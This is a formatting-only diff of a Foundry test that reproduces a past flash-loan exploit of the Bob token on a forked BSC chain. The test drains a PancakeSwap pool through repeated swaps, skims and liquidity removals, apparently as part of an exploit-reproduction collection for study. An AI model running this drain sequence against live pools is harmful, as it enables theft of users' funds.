@@ -13,9 +13,9 @@ import "../basetest.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
@@ -37,7 +37,7 @@ contract Bob is BaseTestWithBalanceLog {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 34428628-1);
+        cheats.createSelectFork("bsc", 34_428_628 - 1);
     }
 
     function testExploit() public {
@@ -45,7 +45,7 @@ contract Bob is BaseTestWithBalanceLog {
         // HackDao.approve(address(Router), type(uint256).max);
         DVM(dodo).flashLoan(100 * 1e18, 0, address(this), "0x00");
 
-        emit log_named_decimal_uint("[End] Attacker BNB balance after exploit",WBNB.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint("[End] Attacker BNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
@@ -58,17 +58,17 @@ contract Bob is BaseTestWithBalanceLog {
         path[1] = address(Bob);
 
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            20000000000000, 0, path, address(this), block.timestamp
+            20_000_000_000_000, 0, path, address(this), block.timestamp
         );
 
         (uint112 reserve0, uint112 reserve1, uint32 timestamp) = cakeLP.getReserves();
-        uint bob_balance = Bob.balanceOf(address(this));
-        uint amount_b = Router.quote(bob_balance, reserve0, reserve1);
+        uint256 bob_balance = Bob.balanceOf(address(this));
+        uint256 amount_b = Router.quote(bob_balance, reserve0, reserve1);
         WBNB.transfer(address(cakeLP), amount_b);
         Bob.transfer(address(cakeLP), bob_balance);
         cakeLP.mint(address(this));
 
-        int index = 0;
+        int256 index = 0;
         while (index < 9) {
             Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                 WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
@@ -77,7 +77,7 @@ contract Bob is BaseTestWithBalanceLog {
             Bob.transfer(address(cakeLP), Bob.balanceOf(address(this)));
             cakeLP.skim(address(cakeLP));
             (uint112 reserve0, uint112 reserve1, uint32 timestamp) = cakeLP.getReserves();
-            uint bob_balance = Bob.balanceOf(address(cakeLP));
+            uint256 bob_balance = Bob.balanceOf(address(cakeLP));
             uint256 amountOut = Router.getAmountOut(96 * bob_balance / 100, reserve0, reserve1);
             cakeLP.swap(0, amountOut, address(this), abi.encode("0x00"));
 
@@ -85,9 +85,11 @@ contract Bob is BaseTestWithBalanceLog {
             path[0] = address(WBNB);
             path[1] = address(Bob);
 
-            Router.swapTokensForExactTokens(90 * bob_balance / 100, WBNB.balanceOf(address(this)), path, router, block.timestamp);
+            Router.swapTokensForExactTokens(
+                90 * bob_balance / 100, WBNB.balanceOf(address(this)), path, router, block.timestamp
+            );
             Router.removeLiquidityETHSupportingFeeOnTransferTokens(
-                address(Bob), 1000000000000000000, 1, 1, address(this), block.timestamp
+                address(Bob), 1_000_000_000_000_000_000, 1, 1, address(this), block.timestamp
             );
 
             address[] memory path_reverse = new address[](2);
@@ -105,7 +107,6 @@ contract Bob is BaseTestWithBalanceLog {
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
         return;
     }
-    
-    fallback() external payable {}
 
+    fallback() external payable {}
 }
